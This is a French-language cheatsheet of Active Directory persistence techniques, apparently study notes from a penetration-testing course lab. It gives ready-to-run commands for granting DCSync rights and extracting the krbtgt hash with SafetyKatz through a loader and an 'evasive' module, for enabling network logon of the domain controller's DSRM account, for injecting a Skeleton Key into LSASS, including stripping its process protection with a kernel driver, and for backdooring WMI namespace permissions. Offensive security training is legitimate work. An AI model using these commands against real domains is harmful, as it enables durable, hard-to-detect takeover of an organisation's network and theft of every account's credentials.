# Cheatsheet - Persistence

> [!summary] Objectif
> Persistance spécifique AD : DCSync (extraire n'importe quel hash à volonté) et l'administrateur DSRM du DC (compte local du DC, indépendant d'un reset de mot de passe de domaine).

> [!abstract] Pourquoi · Chaînage
> **Garder** l'accès: DCSync (hash à volonté), DSRM, Skeleton Key.
> **Prérequis** DA / droits de réplication → **débloque** creds-on-demand (krbtgt → Golden) + retour durable sur le DC.

### DCSync — droits de réplication

> Une fois le droit posé, permet d'extraire à volonté le hash de *n'importe quel* compte du domaine (dont `krbtgt`, la clé pour forger des Golden Tickets) sans jamais se connecter au DC ni laisser de trace de dump local — un accès credential-on-demand qui survit à la plupart des remédiations ponctuelles.

> [!warning]- Required
> Les droits de réplication (`DS-Replication-Get-Changes[-All]`) — déjà présents sur certains comptes de service, ou à ajouter soi-même depuis un accès DA déjà obtenu (voir [[Cheatsheet - Tickets Kerberos]]).

```powershell
Get-DomainObjectAcl -SearchBase "DC=<DOMAIN>,DC=local" -SearchScope Base -ResolveGUIDs |
  ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} |
  ?{$_.IdentityName -match "<USER>"}
# si absent, l'ajouter depuis un contexte DA :
Add-DomainObjectAcl -TargetIdentity 'DC=<DOMAIN>,DC=local' -PrincipalIdentity <USER> -Rights DCSync
# puis extraire :
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:<DOMAIN>\krbtgt" "exit"
```

Une fois le droit `DS-Replication-Get-Changes(-All)` posé sur un user compromis, la persistance est quasi invisible : plus besoin de retoucher le DC pour ré-extraire un hash.

### DSRM — administrateur local du DC

> Donne un accès admin complet au DC via un compte *local* (mode restauration), totalement indépendant du domaine — ce chemin survit à un reset du mot de passe de n'importe quel compte de domaine (y compris `Administrator` et `krbtgt`), contrairement aux Golden/Diamond tickets qui, eux, meurent avec `krbtgt`.

> [!warning]- Required
> Privilèges Domain Admin déjà obtenus (pour élever à SYSTEM sur le DC et dumper le SAM) — voir [[Cheatsheet - Tickets Kerberos]] / [[Cheatsheet - Lateral movement]] pour y arriver.

```cmd
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```

Autorise le compte DSRM (hash extrait via `lsadump::evasive-sam` après élévation SYSTEM) à se connecter par le réseau. Ensuite Pass-the-Hash (pas OverPass) avec ce hash NTLM local → accès DC indépendant du domaine.

> [!note] Golden/Diamond ticket sont aussi des mécanismes de persistance (clé `krbtgt`) — détaillés dans [[Cheatsheet - Tickets Kerberos]].

### Skeleton Key — patch du LSASS du DC

> Injecte un « passe-partout » dans le LSASS du DC : après le patch, *tous* les comptes du domaine acceptent un mot de passe maître unique (`mimikatz`) **en plus** du leur → on se connecte comme n'importe qui, sans toucher aux hash. Accès immédiat mais volatile.

> [!warning]- Required
> Privilèges Domain Admin (le patch s'exécute sur le DC). Ne survit **pas** à un redémarrage du DC et n'est pas OPSEC-safe.

```powershell
# Injecter la skeleton key sur un DC (mot de passe maître = "mimikatz")
C:\AD\Tools\SafetyKatz.exe '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
# Se connecter comme n'importe quel compte avec le mot de passe "mimikatz"
Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\Administrator
```

Si LSASS tourne en processus protégé (PPL), charger d'abord le driver `mimidriv.sys` (`!+` puis `!processprotect /process:lsass.exe /remove`) avant `misc::skeleton` — très bruyant (installation d'un driver kernel).

> [!note] Non persistant au reboot, et connu pour casser AD CS. À réserver à un accès court ; préférer DCSync / Golden pour une persistance durable.

### WMI namespace security descriptor — accès WMI/PSRemoting sans être admin local (F22)

> Modifier le security descriptor du namespace WMI `root\cimv2` sur le DC : ajouter un user standard (`studentx`) avec les mêmes permissions que **BA** (Builtin\Administrators) → accès `Invoke-WmiMethod` / PSRemoting persistant sans appartenir à Administrators.

> [!warning]- Required
> Contexte DA sur la cible (pour lire/écrire le security descriptor du namespace WMI).

```powershell
# 1. Lire le SD actuel de root\cimv2 pour repérer les permissions BA (bits SDDL type CCDCLCSWRPWPRCWD)
$sd = Invoke-WmiMethod -Namespace root/cimv2 -Path "__systemsecurity=@" -Name GetSecurityDescriptor -ComputerName dcorp-dc
([wmiclass]"\\dcorp-dc\root\cimv2:Win32_SecurityDescriptorHelper").BinarySDToSDDL($sd.Descriptor).SDDL

# 2. Injecter l'ACE studentx via Set-RemoteWMI (Nishang)
. C:\AD\Tools\Set-RemoteWMI.ps1
Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
```

Bits SDDL : `CC` CreateChild, `DC` DeleteChild, `LC` List, `SW` Self-Write, `RP` ReadProp, `WP` WriteProp, `RC` ReadControl, `WD` WriteDac. `CI` = Container-Inherit. L'ACE injectée aura la forme `(A;CI;CCDCLCSWRPWPRCWD;;;<SID_studentx>)`.

### Repères génériques Windows (secondaire)

```powershell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
```

**Link**
- [[Cheatsheet - Tickets Kerberos]]
- [[Cheatsheet - Post-exploitation]]
- [[Cheatsheet - Privilege escalation]]
